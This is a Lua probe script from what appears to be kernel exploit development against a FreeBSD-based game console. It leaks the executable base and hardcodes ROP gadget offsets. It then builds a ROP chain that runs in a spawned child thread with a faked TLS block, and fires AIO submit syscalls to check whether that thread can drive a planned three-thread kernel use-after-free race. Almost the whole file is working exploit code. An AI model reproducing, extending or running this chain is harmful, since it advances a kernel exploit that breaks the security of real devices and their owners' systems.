-- CRASH_CLASS: MODERATE
-- PROBE 71g: Can a child thread call 669 (AIO submit) without r8 control?
--
-- The 3-thread UAF needs Thread C to submit AIO requests at kernel speed.
-- 669 takes 5 args: (cmd, reqs, count, class, ids_output).
-- We control 4 registers (rdi/rsi/rdx/rcx). r8 (5th arg) is uncontrolled.
--
-- With sysarch(SET_FSBASE) for TLS safety, even if 669 fails (EFAULT on
-- r8 copyout), the child survives. The question: does 669 still ALLOCATE
-- kernel objects even when the IDs copyout fails?
--
-- Test:
--   1. Count existing AIO IDs via 666 sweep
--   2. Child thread: sysarch + 669(1, req, 1, 1) with garbage r8
--   3. Count AIO IDs again — new IDs = child's allocations
--   4. If new IDs exist, child 669 works for allocation

print("=== PROBE 71g: CHILD THREAD 669 TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(N(info))) end)
local EB = (rd(info + 0x10C) or 0) * 0x100000000 + (rd(info + 0x108) or 0)
print("eboot=" .. string.format("0x%X", EB))

local stub = syscall.pipe.fn_addr
local pid = N(mk(20)())
print("pid=" .. pid)

local g_pop_rax = uint64(EB + 0x992)
local g_pop_rdi = uint64(EB + 0xC9DFE)
local g_pop_rsi = uint64(EB + 0xD77D)
local g_pop_rdx = uint64(EB + 0x3B02D7)
local g_pop_rcx = uint64(EB + 0xE64)
local g_bare_ret = uint64(EB + 0x42)
local g_mov_m_rax = uint64(EB + 0x92C67)

-- Open /dev/zero
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)
local ok, zfd_v = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
local zfd = N(zfd_v)
print("zero_fd=" .. zfd)

local data_buf = memory.alloc(256)
local result_buf = memory.alloc(8)

-- Create request template in shared memory
local req_tmpl = memory.alloc(0x28)
wq(req_tmpl + 0x00, uint64(0))
wq(req_tmpl + 0x08, uint64(16))
wq(req_tmpl + 0x10, uint64(N(data_buf)))
wq(req_tmpl + 0x18, uint64(N(result_buf)))
wq(req_tmpl + 0x20, uint64(zfd))

-- Create fake TCB for child TLS
local fake_tcb = memory.alloc(0x1000)
local tcb_addr = N(fake_tcb)
for i = 0, 0xFFC, 8 do wq(tcb_addr + i, uint64(tcb_addr)) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(tcb_addr))

print("")

-- ============================================================
-- [A] Baseline: count AIO IDs before child 669
-- ============================================================
print("[A] Baseline: submit 2 from main thread")
local main_ids = {}
for i = 1, 2 do
    local ib = memory.alloc(8); wd(ib, 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req_tmpl)), uint64(1), uint64(1), uint64(N(ib)))
    end)
    local aid = rd(ib)
    if aid and aid ~= 0 then main_ids[#main_ids + 1] = aid end
end
print(string.format("  main submitted %d IDs", #main_ids))
for _, aid in ipairs(main_ids) do
    print(string.format("    id=0x%08X", aid))
end
print("")

-- ============================================================
-- [B] Child thread: sysarch + 669 × 4, write marker
-- ============================================================
print("[B] Child thread: sysarch + 4x 669 calls")

-- IDs output buffer (writable, in case r8 points somewhere valid)
local child_ids_buf = memory.alloc(32)
for i = 0, 28, 4 do wd(N(child_ids_buf) + i, 0) end

local marker = memory.alloc(8); wq(marker, uint64(0))
local retval_buf = memory.alloc(8); wq(retval_buf, uint64(0xDEAD))

-- Build child ROP chain
local stk = memory.alloc(0x4000)
local sb = N(stk)
local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
local off = 0
local function em(v) wq(rsp + off, v); off = off + 8 end

-- Step 1: sysarch(129, &tcb_ptr) — SET_FSBASE
em(g_pop_rdi); em(uint64(129))
em(g_pop_rsi); em(uint64(N(tcb_ptr)))
em(g_pop_rax); em(uint64(165))    -- sysarch
em(stub)

-- Step 2: write sysarch return value to retval_buf
em(g_pop_rdi); em(uint64(N(retval_buf)))
em(g_mov_m_rax)

-- Step 3: 669(1, req, 1, 1) × 4 — r8 is uncontrolled
-- Note: r8 might be 0, might be garbage. 669 may fail copyout but
-- still allocate kernel objects.
for i = 1, 4 do
    em(g_pop_rdi); em(uint64(1))               -- cmd = 1 (read)
    em(g_pop_rsi); em(uint64(N(req_tmpl)))     -- req pointer
    em(g_pop_rdx); em(uint64(1))               -- count = 1
    em(g_pop_rcx); em(uint64(1))               -- class = 1
    em(g_pop_rax); em(uint64(669))
    em(stub)
end

-- Step 4: write marker
em(g_pop_rax); em(uint64(0xC0DE))
em(g_pop_rdi); em(uint64(N(marker)))
em(g_mov_m_rax)

-- Step 5: thr_exit
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

-- thr_new params
local par = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
wq(N(par), g_bare_ret)
wq(N(par) + 0x10, uint64(sb))
wq(N(par) + 0x18, uint64(0x2000))
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(N(par) + 0x30, tid)

-- Launch child
pcall(function() mk(455)(par, uint64(0x38)) end)

-- Wait
for w = 1, 500000 do local _ = rd(sb) end

local mk_val = rd(marker)
local rv_val = rd(retval_buf)
print(string.format("  marker=0x%X sysarch_ret=0x%X", mk_val or 0, rv_val or 0))
print("")

-- ============================================================
-- [C] Check: did child's 669 calls create new AIO requests?
-- ============================================================
print("[C] Scan for new AIO IDs created by child")

-- Scan a range of possible IDs (generation-checked, so we need to try many)
-- From 71a: IDs use gen[15:13]|slot[12:0]
-- Main thread's IDs had slots starting at some value
-- Child's IDs would be new slots or same slots with new generation

-- Check if child_ids_buf has any non-zero values
local child_wrote = false
for i = 0, 28, 4 do
    local v = rd(N(child_ids_buf) + i)
    if v and v ~= 0 then
        print(string.format("  child_ids_buf[%d]=0x%08X", i/4, v))
        child_wrote = true
    end
end
if not child_wrote then
    print("  child_ids_buf: all zero (r8 didn't point here)")
end

-- Try to find new IDs by scanning status (666)
-- Check IDs near the main thread's IDs
local found_new = {}
if #main_ids > 0 then
    local base_slot = main_ids[1] % 8192  -- low 13 bits = slot
    -- Scan slots near the base
    for slot_off = -2, 20 do
        local test_slot = base_slot + slot_off
        if test_slot >= 0 and test_slot < 8192 then
            -- Try all 8 generations
            for gen = 0, 7 do
                local test_id = gen * 8192 + test_slot
                local ib = memory.alloc(8); wd(ib, test_id)
                local sb2 = memory.alloc(8); wd(sb2, 0xDEAD)
                pcall(function() mk(666)(uint64(N(ib)), uint64(1), uint64(N(sb2))) end)
                local st = rd(sb2)
                if st ~= 0x80020003 and st ~= 0xDEAD then
                    -- Found a valid entry!
                    local is_main = false
                    for _, mid in ipairs(main_ids) do
                        if mid == test_id then is_main = true end
                    end
                    if not is_main then
                        found_new[#found_new + 1] = {id = test_id, status = st}
                    end
                end
            end
        end
    end
end

print(string.format("  found %d new AIO entries (not from main thread)", #found_new))
for _, e in ipairs(found_new) do
    print(string.format("    id=0x%08X status=0x%08X", e.id, e.status))
end

if #found_new > 0 then
    print("")
    print("*** CHILD 669 CREATED KERNEL OBJECTS ***")
    print("*** Thread C via child thread IS VIABLE ***")
    print("*** 3-thread UAF can use child thread for submissions ***")
else
    print("")
    print("No new entries found — child's 669 calls may have failed entirely")
    print("(r8 copyout failure may roll back the allocation)")
end
print("")

-- Cleanup
for _, aid in ipairs(main_ids) do
    local ib = memory.alloc(8); wd(ib, aid)
    local sb2 = memory.alloc(8)
    pcall(function() mk(664)(uint64(N(ib)), uint64(1), uint64(N(sb2))) end)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(sb2))) end)
end
for _, e in ipairs(found_new) do
    local ib = memory.alloc(8); wd(ib, e.id)
    local sb2 = memory.alloc(8)
    pcall(function() mk(664)(uint64(N(ib)), uint64(1), uint64(N(sb2))) end)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(sb2))) end)
end

print("alive=YES")
print("=== PROBE 71g COMPLETE ===")
